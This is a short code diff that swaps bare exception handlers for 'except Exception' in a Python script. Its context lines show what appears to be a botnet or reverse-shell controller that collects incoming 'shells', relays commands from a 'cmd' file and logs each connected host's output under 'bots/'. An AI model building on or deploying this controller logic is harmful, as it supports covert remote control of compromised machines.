@@ -36,7 +36,7 @@ try:
 			conn.setblocking(0)
 			shells.append((conn,caddr))
 			print('new '+str(caddr))
-		except:
+		except Exception:
 			pass
 
 		cmd=''
@@ -53,7 +53,7 @@ try:
 				cmd_file=open('cmd','w')
 				cmd_file.write('')
 				cmd_file.close()
-			except:
+			except Exception:
 				pass
 
 		for shell in shells:
@@ -74,7 +74,7 @@ try:
 							ostr=open("bots/"+str(caddr[0]+':'+str(caddr[1])),'a')
 							ostr.write(data)
 							ostr.close()
-						except:
+						except Exception:
 							pass
 					else:
 						raise(Exception("Killing..."))
